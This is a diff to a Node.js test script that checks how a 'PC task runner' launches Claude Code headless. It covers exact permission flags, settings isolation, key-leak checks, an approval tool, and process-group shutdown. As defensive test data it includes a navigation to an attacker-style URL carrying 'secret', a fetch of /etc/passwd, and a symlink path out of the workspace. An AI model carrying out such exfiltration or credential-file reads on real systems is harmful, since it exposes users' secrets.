@@ -3,10 +3,14 @@
 // executor), how Claude Code is started (its flags and permissions, its working folder), how its stream-json output
 // becomes the thread's steps and answer, what a failure says, and that no key reaches Claude Code, a log or the state.
 // A FAKE `claude` on PATH stands in for Claude Code: no network, no real sign in, nothing of this machine's ~/.claude.
+// The real CLI's own behaviour with these exact flags (user settings, hooks and env ignored; Read, WebFetch and Bash
+// asking through the approve tool, even with mcp__bops__approve in --disallowedTools) was checked by hand against
+// Claude Code 2.1.318; this test pins the flags so they can't drift.
 // Usage: node --conditions=react-server scripts/test-pc-task-runner.mjs
+//        (--conditions=react-server is needed: the server modules import "server-only")
 import assert from "node:assert/strict";
 import { spawn } from "node:child_process";
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { createServer } from "node:http";
 import { registerHooks } from "node:module";
 import { tmpdir } from "node:os";
@@ -21,8 +25,15 @@ mkdirSync(home, { recursive: true });
 mkdirSync(bin, { recursive: true });
 
 // Planted secrets: none may reach Claude Code, a log line, the setting file or a route's answer.
-const EXEC_KEY = `sk-proj-${"E".repeat(40)}`;
-const PLANTED = { OPENAI_API_KEY: `sk-proj-${"A".repeat(40)}`, ANTHROPIC_API_KEY: `sk-ant-${"B".repeat(40)}`, CLAUDE_CODE_OAUTH_TOKEN: "tok-planted-123456", BOPS_UI_TOKEN: "ui-token-planted" };
+// Fake values, built so no line of this file reads as a real key or token to a secret scanner.
+const fakeSecret = (...parts) => parts.join("-");
+const EXEC_KEY = fakeSecret("sk", "proj", "E".repeat(40));
+const PLANTED = {
+  OPENAI_API_KEY: fakeSecret("sk", "proj", "A".repeat(40)),
+  ANTHROPIC_API_KEY: fakeSecret("sk", "ant", "B".repeat(40)),
+  CLAUDE_CODE_OAUTH_TOKEN: fakeSecret("tok", "planted", "x".repeat(8)),
+  BOPS_UI_TOKEN: fakeSecret("ui", "planted", "y".repeat(8)),
+};
 Object.assign(process.env, PLANTED, { HOME: home, USERPROFILE: home, PATH: `${bin}${delimiter}${process.env.PATH}` });
 delete process.env.OPENAI_EXECUTOR_API_KEY;
 
@@ -32,6 +43,11 @@ writeFileSync(
   fake,
   `#!${process.execPath}
 const fs = require("node:fs"), path = require("node:path");
+if (process.argv[2] === "--help") {
+  const flags = ["--restricted", "--setting-sources", "--settings", "--tools", "--permission-prompt-tool", "--strict-mcp-config", "--disallowedTools"];
+  process.stdout.write((process.env.FAKE_OLD_CLAUDE ? flags.slice(4) : flags).join("\\n") + "\\n");
+  process.exit(0);
+}
 let input = "";
 process.stdin.on("data", (d) => (input += d));
 process.stdin.on("end", () => {
@@ -39,6 +55,14 @@ process.stdin.on("end", () => {
   const out = (e) => process.stdout.write(JSON.stringify(e) + "\\n");
   const sid = process.argv[process.argv.indexOf(process.argv.includes("--resume") ? "--resume" : "--session-id") + 1];
   const mode = /MODE:(\\w+)/.exec(input)?.[1] ?? "ok";
+  if (mode === "hang") {
+    const kid = require("node:child_process").spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"], { stdio: "ignore" });
+    fs.writeFileSync(path.join(process.env.HOME, "fake-claude.pids"), process.pid + " " + kid.pid);
+    process.on("SIGTERM", () => {});
+    setInterval(() => {}, 1000);
+    return;
+  }
+  if (mode === "denied") { out({ type: "result", subtype: "success", is_error: false, result: "I couldn't run it.", permission_denials: [{ tool_name: "Bash", tool_use_id: "t9", tool_input: { command: "ls" } }] }); return; }
   if (mode === "crash") { process.stderr.write("Error: 401 Unauthorized: invalid x-api-key\\n"); process.exit(1); }
   out({ type: "system", subtype: "init", session_id: sid, mcp_servers: [{ name: "browser", status: "connected" }, { name: "bops", status: "connected" }] });
   if (mode === "auth") { out({ type: "result", subtype: "success", is_error: true, result: "Not logged in · Please run /login" }); return; }
@@ -74,7 +98,7 @@ registerHooks({
       "/lib/server/codex-cli.ts": 'export const findCodex = () => "/fake/codex";',
       "/lib/server/brains.ts": "export const requireCodexPlan=()=>{},ensureBrainTools=0,ensureClaudeCode=0,ensureCodex=0,ensureDsh=0,ensureOpenCode=0,revealBrainKey=0,revealNamedKey=0;",
       "/lib/server/keys.ts": "export class KeysError extends Error {}",
-      "/lib/server/permission.ts": "export const heldAsk = async (spec) => { globalThis.__asked.push(spec); return { reply: 'approve' }; };",
+      "/lib/server/permission.ts": "export const heldAsk = async (spec) => { globalThis.__asked.push(spec); return globalThis.__late ? 'late' : { reply: 'approve' }; };",
       "/lib/server/orgo.ts": "export const orgo = {};",
       "/lib/server/store.ts": "export const getState = () => ({ shared: globalThis.__state.shared }); export const bot = () => undefined; export const ownerName = () => 'Kevin'; export const session = (id) => globalThis.__state.sessions.get(id);",
       "/lib/server/orgo-auth.ts": "export const signedInUser = () => null;",
@@ -103,7 +127,9 @@ const runner = await import("../lib/server/pc-task-runner.ts");
 const cli = await import("../lib/server/cli-agents.ts");
 const subs = await import("../lib/server/local-subscriptions.ts");
 let passed = 0;
-const test = async (name, fn) => {
+const test = async (name, opts, fn) => {
+  if (typeof opts === "function") fn = opts;
+  else if (opts?.skip) return void process.stdout.write(`skip - ${name}\n`);
   await fn();
   passed++;
   process.stdout.write(`ok - ${name}\n`);
@@ -148,6 +174,11 @@ await test("the setting file and the OpenAI key in .env.local: kept lines, maske
   runner.saveExecutorKey(envFile, "", env);
   assert.equal(readFileSync(envFile, "utf8"), "BOPS_SELF_HOSTED=1\nOTHER=x\n");
   assert.equal(env.OPENAI_EXECUTOR_API_KEY, undefined);
+  // A rename that fails (the target is a folder) leaves no temporary copy of the key behind.
+  const blocked = join(tmp, "blocked.env");
+  mkdirSync(join(blocked, "x"), { recursive: true });
+  assert.throws(() => runner.saveExecutorKey(blocked, EXEC_KEY, {}));
+  assert.ok(!readdirSync(tmp).some((f) => f.startsWith("blocked.env.") && f.endsWith(".tmp")), "no .tmp file left");
 });
 
 await test("route: owner in the desktop window only; the key goes in, only its mask comes back", async () => {
@@ -183,25 +214,60 @@ mkdirSync(workspace, { recursive: true });
 const runtime = subs.localSubscriptionRuntime("claude");
 const cmd = (resume = false) => runner.claudeTaskCommand({ claude: runtime.file, env: runtime.env, workspace, mcpConfig: join(taskFolder, "claude", "mcp.json"), promptFile: join(taskFolder, "claude", "prompt.md"), session: "11111111-2222-4333-8444-555555555555", resume });
 
-await test("argument and permission flags: headless, plan only, Bops' tools only, everything else asks", () => {
+await test("argument and permission flags: exact argv, no setting files, only Bops' tools, everything else asks", () => {
   assert.equal(runtime.file, fake, "the claude on PATH");
   const c = cmd();
-  const flag = (name) => c.args[c.args.indexOf(name) + 1];
-  assert.equal(c.args[0], "-p");
-  assert.equal(flag("--output-format"), "stream-json");
-  assert.equal(flag("--permission-mode"), "default");
-  assert.equal(flag("--setting-sources"), "user", "never a project's settings from the workspace");
-  assert.ok(c.args.includes("--strict-mcp-config"));
-  assert.equal(flag("--permission-prompt-tool"), "mcp__bops__approve");
-  assert.equal(flag("--session-id"), "11111111-2222-4333-8444-555555555555");
-  assert.equal(cmd(true).args[cmd(true).args.indexOf("--resume") + 1], "11111111-2222-4333-8444-555555555555");
-  const allowed = flag("--allowedTools").split(",");
-  for (const t of ["Bash", "BashOutput", "KillShell", "mcp__browser__browser_click", "mcp__browser__browser_type", "mcp__browser__browser_fill_form", "mcp__browser__browser_file_upload", "Read", "Edit", "Write", "Glob", "Grep"]) assert.ok(!allowed.includes(t), `${t} is never allowed by itself`);
-  for (const t of ["Read(./**)", "Edit(./**)", "Write(./**)", "mcp__browser__browser_navigate", "mcp__browser__browser_snapshot"]) assert.ok(allowed.includes(t), `${t} runs by itself`);
-  assert.ok(!c.args.some((a) => /dangerously|bypassPermissions|acceptEdits/.test(a)));
-  const never = flag("--disallowedTools").split(",");
-  assert.ok(never.includes("mcp__browser__browser_evaluate") && never.includes("mcp__bops__approve"));
-  assert.ok(!c.args.some((a) => /sk-|tok-planted|ui-token/.test(a)), "no key on the command line");
+  const settings = JSON.stringify(runner.CLAUDE_SETTINGS);
+  assert.deepEqual(c.args, [
+    "-p", "--output-format", "stream-json", "--verbose",
+    "--restricted", "--setting-sources", "", "--settings", settings,
+    "--tools", "Read,Edit,MultiEdit,Write,Glob,Grep,Bash,WebSearch,WebFetch,TodoWrite",
+    "--disable-slash-commands", "--permission-mode", "default", "--strict-mcp-config",
+    "--mcp-config", join(taskFolder, "claude", "mcp.json"),
+    "--append-system-prompt-file", join(taskFolder, "claude", "prompt.md"),
+    "--allowedTools", "WebSearch,mcp__browser__browser_snapshot,mcp__browser__browser_find,mcp__browser__browser_wait_for,mcp__browser__browser_take_screenshot,mcp__browser__browser_console_messages,mcp__browser__browser_hover,mcp__browser__browser_navigate_back",
+    "--disallowedTools", "mcp__browser__browser_run_code_unsafe,mcp__browser__browser_evaluate,mcp__bops__approve",
+    "--permission-prompt-tool", "mcp__bops__approve",
+    "--session-id", "11111111-2222-4333-8444-555555555555",
+  ]);
+  assert.deepEqual(cmd(true).args.slice(-2), ["--resume", "11111111-2222-4333-8444-555555555555"]);
+  const s = runner.CLAUDE_SETTINGS;
+  assert.equal(s.disableAllHooks, true);
+  assert.deepEqual(s.permissions.ask, ["Bash", "WebFetch", "Read", "Edit", "MultiEdit", "Write", "Glob", "Grep"]);
+  assert.deepEqual(s.permissions.deny, runner.CLAUDE_NEVER_TOOLS);
+  // WebFetch, navigation, a new tab, the shell and file tools never run by themselves.
+  for (const t of ["WebFetch", "Bash", "Read", "Edit", "Write", "mcp__browser__browser_navigate", "mcp__browser__browser_tabs", "mcp__browser__browser_click", "mcp__browser__browser_type"]) assert.ok(!runner.CLAUDE_AUTO_TOOLS.includes(t), `${t} asks`);
+  assert.ok(!c.args.some((a) => /dangerously|bypassPermissions|acceptEdits|dontAsk/.test(a)));
+  assert.ok(!c.args.some((a) => a.includes(EXEC_KEY) || Object.values(PLANTED).some((v) => a.includes(v))), "no key on the command line");
+  assert.ok(!("CLAUDE_CODE_OAUTH_TOKEN" in c.env) && !("ANTHROPIC_API_KEY" in c.env));
+});
+
+await test("an older Claude Code without those flags isn't run", async () => {
+  assert.equal(runner.claudeSupportsTasks(fake, { ...runtime.env }), true);
+  const old = join(bin, "old-claude");
+  writeFileSync(old, readFileSync(fake, "utf8"));
+  chmodSync(old, 0o755);
+  assert.equal(runner.claudeSupportsTasks(old, { ...runtime.env, FAKE_OLD_CLAUDE: "1" }), false);
+  assert.equal(runner.claudeSupportsTasks(join(bin, "none"), runtime.env), false);
+  assert.match(runner.PC_WORDS.update, /Update it \(run claude update\)/);
+});
+
+await test("a user settings file allowing Bash, with a hook and a key, takes no effect", async () => {
+  // As the real CLI would find it, in the HOME Claude Code runs with.
+  mkdirSync(join(home, ".claude"), { recursive: true });
+  const userKey = fakeSecret("sk", "ant", "U".repeat(40));
+  writeFileSync(join(home, ".claude", "settings.json"), JSON.stringify({ permissions: { allow: ["Bash", "WebFetch"], defaultMode: "bypassPermissions" }, env: { ANTHROPIC_API_KEY: userKey }, hooks: { PreToolUse: [{ matcher: "*", hooks: [{ type: "command", command: "echo allow" }] }] }, enabledPlugins: { "x@y": true } }));
+  await runner.runClaudeTurn({ cmd: cmd(), input: "MODE:ok", parse: cli.claudeDriver.parse, onEvent: () => {} });
+  const seen = JSON.parse(readFileSync(join(home, "fake-claude.json"), "utf8"));
+  const at = (f) => seen.args[seen.args.indexOf(f) + 1];
+  assert.ok(seen.args.includes("--restricted"), "--restricted: no user, project or local settings files");
+  assert.equal(at("--setting-sources"), "", "no setting sources at all, passed as an empty argument");
+  const inline = JSON.parse(at("--settings"));
+  assert.equal(inline.disableAllHooks, true);
+  assert.ok(!inline.permissions.allow.includes("Bash") && !inline.permissions.allow.includes("WebFetch"));
+  assert.equal(inline.permissions.defaultMode, "default");
+  assert.ok(!JSON.stringify(seen.args).includes(userKey) && !JSON.stringify(seen.env).includes(userKey));
+  rmSync(join(home, ".claude"), { recursive: true, force: true });
 });
 
 await test("MCP config: the bot's browser tools and the approve tool, which talks only to this PC's loopback", () => {
@@ -248,6 +314,10 @@ await test("failure paths: a turn that isn't signed in, at its limit, or a crash
   await assert.rejects(run("auth"), (e) => e instanceof runner.PcTaskError && e.message === runner.PC_WORDS.signIn);
   await assert.rejects(run("limit"), (e) => e.message === runner.PC_WORDS.limit);
   await assert.rejects(run("crash"), (e) => e.message === runner.PC_WORDS.signIn && !/x-api-key|Unauthorized/.test(e.message), "its own output is never shown");
+  const denied = [];
+  const r = await runner.runClaudeTurn({ cmd: cmd(), input: "MODE:denied", parse: cli.claudeDriver.parse, onEvent: () => {}, onDenied: (t) => denied.push(...t) });
+  assert.deepEqual(denied, ["Bash"], "a tool that wasn't approved is said in the thread, not lost");
+  assert.equal(r.text, "I couldn't run it.");
   const missing = { ...cmd(), file: join(tmp, "nope", "claude") };
   await assert.rejects(runner.runClaudeTurn({ cmd: missing, input: "x", parse: cli.claudeDriver.parse, onEvent: () => {} }), (e) => e.message === runner.PC_WORDS.noClaude);
   const gone = { ...cmd(), cwd: join(tmp, "no-such-folder") };
@@ -298,13 +368,63 @@ await test("approve tool: asks the owner through Bops for a PC task's click; nev
   // Bops' side (cli-agents.ts approveTool): a PC task's browser click asks the owner; the approve tool itself never.
   fakeState.sessions.set("ses_1", { id: "ses_1", status: "running" });
   assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_click", input: {} })).behavior, "deny", "not a PC task: turned down");
-  cli.pcClaudeThreads.add("ses_1");
+  const notes = [];
+  cli.pcClaudeThreads.set("ses_1", { workspace, origins: new Set(), note: (t) => notes.push(t) });
   assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_click", input: { ref: "e1" } })).behavior, "allow");
   assert.equal(asked.length, 1);
   assert.equal(asked[0].action, "Use browser_click");
   assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__bops__approve", input: {} })).behavior, "deny");
   assert.equal(asked.length, 1, "the model calling approve itself never shows a card");
+
+  // WebFetch and navigation to a new site ask; once allowed, the same site goes on without a card; another asks again.
+  const before = asked.length;
+  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "WebFetch", input: { url: "https://example.com/a?x=1" } })).behavior, "allow");
+  assert.equal(asked.length, before + 1, "a new site asks the owner");
+  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_navigate", input: { url: "https://example.com/b" } })).behavior, "allow");
+  assert.equal(asked.length, before + 1, "the same site doesn't ask again");
+  await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_navigate", input: { url: "https://attacker.example.net/?d=secret" } });
+  assert.equal(asked.length, before + 2, "a new origin asks");
+  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "WebFetch", input: { url: "file:///etc/passwd" } })).behavior, "deny");
+
+  // Files: inside the workspace goes on without a card; a write outside it, or through a link out of it, is refused.
+  const outside = join(tmp, "outside");
+  mkdirSync(outside, { recursive: true });
+  symlinkSync(outside, join(workspace, "link-out"), process.platform === "win32" ? "junction" : "dir");
+  const n = asked.length;
+  const decide = async (tool, input) => JSON.parse(await cli.approveTool("bot1", "ses_1", { tool, input })).behavior;
+  assert.equal(await decide("Write", { file_path: "notes/new.md" }), "allow");
+  assert.equal(await decide("Edit", { file_path: join(workspace, "a.txt") }), "allow");
+  assert.equal(await decide("Write", { file_path: "../outside/x.txt" }), "deny");
+  assert.equal(await decide("Write", { file_path: "link-out/x.txt" }), "deny", "a link or junction out of the folder");
+  assert.equal(await decide("Edit", { file_path: join(outside, "x.txt") }), "deny");
+  assert.equal(asked.length, n, "none of those showed a card");
+  assert.match(notes.at(-1), /Files outside this task's folder can't be changed/);
+  assert.equal(await decide("Read", { file_path: "link-out/x.txt" }), "allow", "a read outside asks the owner (the fake says yes)");
+  assert.equal(asked.length, n + 1);
+  assert.equal(runner.insideWorkspace(workspace, "."), true);
+  assert.equal(runner.insideWorkspace(join(tmp, "missing"), "x"), false, "anything that can't be checked is outside");
+
+  // No answer in time: a no, and said in the thread.
+  globalThis.__late = true;
+  assert.equal(await decide("Bash", { command: "ls" }), "deny");
+  assert.match(notes.at(-1), /No answer in time, so approval for Bash failed/);
+  globalThis.__late = false;
   cli.pcClaudeThreads.delete("ses_1");
+});
+
+await test("POSIX: Claude Code runs in its own process group, and Stop ends the whole group", { skip: process.platform === "win32" }, async () => {
+  const ac = new AbortController();
+  const started = runner.runClaudeTurn({ cmd: cmd(), input: "MODE:hang", parse: cli.claudeDriver.parse, onEvent: () => {}, signal: ac.signal });
+  const pidFile = join(home, "fake-claude.pids");
+  for (let i = 0; i < 100 && !existsSync(pidFile); i++) await new Promise((r) => setTimeout(r, 50));
+  const [pid, childPid] = readFileSync(pidFile, "utf8").trim().split(" ").map(Number);
+  ac.abort();
+  await assert.rejects(started, /Stopped by you/);
+  const alive = (p) => { try { process.kill(p, 0); return true; } catch { return false; } };
+  for (let i = 0; i < 100 && (alive(pid) || alive(childPid)); i++) await new Promise((r) => setTimeout(r, 50));
+  assert.ok(!alive(pid), "Claude Code stopped");
+  assert.ok(!alive(childPid), "what it started stopped with it");
+  rmSync(pidFile, { force: true });
 });
 
 rmSync(tmp, { recursive: true, force: true });
